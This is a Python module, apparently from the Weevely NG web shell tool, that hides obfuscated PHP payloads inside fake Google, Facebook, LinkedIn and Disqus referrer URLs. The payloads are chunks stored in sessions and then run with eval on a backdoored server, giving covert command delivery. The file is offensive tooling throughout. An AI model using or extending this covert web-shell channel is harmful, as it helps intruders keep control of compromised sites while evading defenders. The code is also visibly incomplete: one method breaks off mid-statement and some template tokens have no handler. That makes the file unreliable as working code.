# -*- coding: utf-8 -*-
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.


import re
import random
import utils
import string
import base64
import hashlib


class Size:

    def __init__(self, min=0, max=0):
        self.min = min
        self.max = max


class StegoVector:

    re_template = re.compile('(?P<integer>{{INT(?P<integer_mult_start>[0-9]+):?(?P<integer_mult_end>[0-9]*)}})|(?P<character>{{CHAR(?P<character_mult_start>[0-9]+):?(?P<character_mult_end>[0-9]*)}})|(?P<domain>{{DOMAIN}})|(?P<baseurl>{{BASEURL}})|(?P<payload>{{PAYLOAD(?P<payload_mult_start>[0-9]+):?(?P<payload_mult_end>[0-9]*)}})')

    def __init__(self, msg, start_delimiter, end_delimiter):
        self.msg = msg
        self.start_delimiter = start_delimiter
        self.end_delimiter = end_delimiter
        self.delimiter_size = len(start_delimiter) + len(end_delimiter)

        self.size = Size()
        self.chunks_sizes = []
        self.chunked_payload = []

        self.pollution = ''

        self.re_template.sub(self._count_payload_size, self.msg)
        self._sum_total_size()

    def _sum_total_size(self):
        self.size.min = sum([size.min for size in self.chunks_sizes])
        self.size.max = sum([size.max for size in self.chunks_sizes])

    def _count_payload_size(self, match):
        if match.group('payload'):

            start = int(match.group('payload_mult_start'))

            end = start
            if match.group('payload_mult_end'):
                end = int(match.group('payload_mult_end'))

            self.chunks_sizes.append(Size(start - self.delimiter_size,
                                          end - self.delimiter_size))

    def _replace(self, match):
        if match.group('integer') and match.group('integer_mult_start'):
            start = int(match.group('integer_mult_start'))

            end = start
            if match.group('integer_mult_end'):
                end = int(match.group('integer_mult_end'))

            return utils.randstr(end, start, string.digits)

        elif match.group('character') and match.group('character_mult_start'):

            start = int(match.group('character_mult_start'))

            end = start
            if match.group('character_mult_end'):
                end = int(match.group('character_mult_end'))

            return utils.randstr(end, start, string.ascii_lowercase)

        elif match.group('domain'):
            return random.choice(['it', 'es', 'uk', 'en', 'com'])

        elif match.group('payload'):
            current_payload = (self.start_delimiter +
                               self.chunked_payload.next() +
                               self.end_delimiter)
            start = int(match.group('payload_mult_start'))

            # Eventually add padding if current_payload is smaller than minsize
            if len(current_payload) < start:
                padding_length = start - len(current_payload)
                current_payload += utils.randstr(padding_length,
                                                 padding_length,
                                                 string.letters)

            return current_payload

    def __repr__(self):
        return 'Size [%i:%i] \'%s\'' % (self.size.min, self.size.max, self.msg)

    def formatp(self, payload_obfuscated):
        if len(payload_obfuscated) <= self.size.max:

            while payload_obfuscated:

                payload_obfuscated_len = len(payload_obfuscated)
                # If template can contain payload_obfuscated payload size
                if payload_obfuscated_len <= self.size.max:

                    chunks = []

                    for size in self.chunks_sizes:
                        max = size.max

                        if payload_obfuscated_len > max:
                            obfuscated_slice = payload_obfuscated[:max]
                            payload_obfuscated = payload_obfuscated[max:]
                        else:
                            obfuscated_slice = payload_obfuscated
                            payload_obfuscated = ''

                        chunks.append(obfuscated_slice)

                    self.chunked_payload = iter(chunks)
                    return self.re_template.sub(self._replace, self.msg)


class StegoVectors:

    def __init__(self, start_delimiter, end_delimiter):
        self.start_delimiter = start_delimiter
        self.end_delimiter = end_delimiter

        self.vector_index = 0

        self.vectors = []

    def add_template_string(self, template):

        template_referrer = StegoVector(template,
                                        self.start_delimiter,
                                        self.end_delimiter)
        self.vectors.append(template_referrer)
        self.vectors.sort(key=lambda vector: vector.size.max, reverse=True)

    def add_vector(self, vector):

        self.vectors.append(vector)
        self.vectors.sort(key=lambda vector: vector.size.max, reverse=True)

    def can_contain_payloads(self, payload_size):

        for vector in self.vectors:
            if vector.size.max >= payload_size:
                return True
        else:
            return False

    def formatp(self, payload):

        remaining_payload = payload[:]
        vector_containers = []


        stego_message_transport = 'session_start(); $_SESSION["%s"]="%s";'
        stego_message_exec = 'session_start(); eval($_SESSION["%s"]);'


        while remaining_payload:
            # Remaining payload is too big, use max vector size
            if len(remaining_payload) > self.vectors[-1].size.max:
                vector_containers.append(



        return containers

    def get_next_vector(self):

        if self.vector_index == len(self.vectors):
            self.vector_index = 0

        yield self.vectors[self.vector_index]

    def __repr__(self):
        return '\n'.join([str(v) for v in self.vectors])

    def __len__(self):
        return len(self.vectors)


class Payload:

    def __init__(self, string):
        self.string = string

    def __len__(self):
        return len(self.string)

    def _find_smallest_obfuscator_not_in_payload(self, payload_b64, md5_pwd):

        max_obfuscator_str = md5_pwd[2:-2]

        i = 1
        while i < len(max_obfuscator_str):
            obfuscator = max_obfuscator_str[:i]
            if obfuscator not in payload_b64:
                return obfuscator
            i += 1

        raise Exception("Obfuscator '%s' is present in payload",
                        max_obfuscator_str)

    def _obfuscate(self, payload_b64, obfuscator, frequency=0.2):

        b64_obfuscated = ''
        for char in payload_b64:
            if random.random() < frequency:
                b64_obfuscated += obfuscator + char
            elif char == '=':
                b64_obfuscated += '_'
            else:
                b64_obfuscated += char

        return b64_obfuscated

    def get_obfuscated(self, pwd):
        md5_pwd = hashlib.md5(pwd).hexdigest()
        payload_b64 = base64.b64encode(self.string)
        obfuscator = self._find_smallest_obfuscator_not_in_payload(payload_b64,
                                                                   md5_pwd)
        payload_b64_obfuscated = self._obfuscate(payload_b64, obfuscator)

        return payload_b64_obfuscated


class StegoChannel:

    def __init__(self, pwd):

        self.md5_pwd = hashlib.md5(pwd).hexdigest()
        start_str = self.md5_pwd[:2]
        end_str = self.md5_pwd[-2:]

        self.templates = StegoVectors(start_str, end_str)
        self.templates.add_template_string("""http://www.google.{{DOMAIN}}/url?sa=t&rct=j&q={{BASEURL}}&source=web&cd={{INT1}}&ved={{PAYLOAD9}}&url={{BASEURL}}&ei={{PAYLOAD22}}&usg={{PAYLOAD34}}""")
        self.templates.add_template_string("""http://www.google.{{DOMAIN}}/url?sa=t&rct=j&q={{BASEURL}}&source=web&cd={{INT1}}&ved={{PAYLOAD9}}&url={{BASEURL}}&ei={{PAYLOAD22}}&usg={{PAYLOAD34}}&sig2={{PAYLOAD22}}""")
        self.templates.add_template_string("""http://www.google.{{DOMAIN}}/imgres?um=1&hl={{LANG}}&safe=active&sa=N&biw=1{{INT3}}&bih={{INT2}}&tbm=isch&tbnid={{PAYLOAD14}}:&imgrefurl={{BASEURL}}&docid={{PAYLOAD14}}&imgurl={{BASEURL}}&w={{INT1}}00&h={{INT1}}00&ei={{PAYLOAD22}}&zoom=1&ved=1t:{{INT3}},r:{{INT2}},s:0,i:129&iact=rc&dur=2789&sig=11{{INT19}}&page=0&tbnh=1{{INT2}}&tbnw=1{{INT2}}&start=0&ndsp={{INT2}}&tx=2{{INT2}}&ty={{INT2}}""")
        self.templates.add_template_string("""http://translate.googleusercontent.com/translate_c?depth=1&rurl=translate.google.com&sl=auto&tl={{LANG}}&u={{BASEURL}}&usg={{PAYLOAD34}}""")
        self.templates.add_template_string("""http://www.facebook.com/l.php?u={{{BASEURL}}&h={{PAYLOAD9:47}}}""")
        self.templates.add_template_string("""http://plus.url.google.com/url?sa=z&n={{INT13}}&url={{BASEURLENC}}&usg={{PAYLOAD27}}""")
        self.templates.add_template_string("""http://redirect.disqus.com/url?threadrank=1&impression={{PAYLOAD36}}&role=thread-footer&forum=1{{INT6}}&thread={{INT9}}&behavior=click&url={{BASEURL}}&type=digest.daily&event=email""")
        self.templates.add_template_string("""http://www.linkedin.com/profile/view?id={{INT8}}&pid={{INT8}}&authType=name&authToken={{CHAR4}}&goback=C{{CHAR1}}&report%2Esuccess={{PAYLOAD62}}""")
        self.templates.add_template_string("""http://www.linkedin.com/profile/view?id={{INT8}}&authType=NAME_SEARCH&authToken={{CHAR4}}&locale={{LANG}}&srchid={{PAYLOAD38}}&srchindex=1&srchtotal=6&goback=C{{CHAR1}}&pvs=ps&trk=pp_profile_photo_link""")



    def send(self, payload, pwd):


        payload_b64_obfuscated = []
        for payload_partition in range(1, len(payload)):

                payload_slices = list(utils.chunks(payload, payload_partition))

                if payload_partition == 1:
                    payload_b64_obfuscated = [
                            Payload(payload).get_obfuscated(pwd) ]
                else:
                    for p_index, p_slice in enumerate(payload_slices):
                        if p_index != len(payload_slices):
                            payload_b64_obfuscated.append('session_start(); $_SESSION["%s"]="%s";'
                                                          % (pwd[:4],Payload(p_slice).get_obfuscated(pwd)))
                        else:
                            payload_b64_obfuscated.append('session_start(); eval($_SESSION["%s"]);' % pwd[:4]);

                can_contain = True
                for prepared_payload in payload_b64_obfuscated:
                    if not self.templates.can_contain_payloads(len(prepared_payload)):
                        can_contain = False
                        break

                if can_contain:
                    break

        print payload_b64_obfuscated


#        open('/tmp/asd.php','w').write("""<?
#$r='{referrer}';
#$b = preg_replace(array('/({end}.*?{start}|{padding}|^[^{startfirstchar}]*{start}|{end}.*$)/', '/(_)/'), array('', '='), $r);
#print($b);
#?>""".format(referrer=formatpted_template, start = start_str, end=end_str, padding=obfuscator, startfirstchar=start_str[0]))
#

if __name__ == "__main__":

    channel = StegoChannel('password')
    channel.send('payload' * 10, 'password')
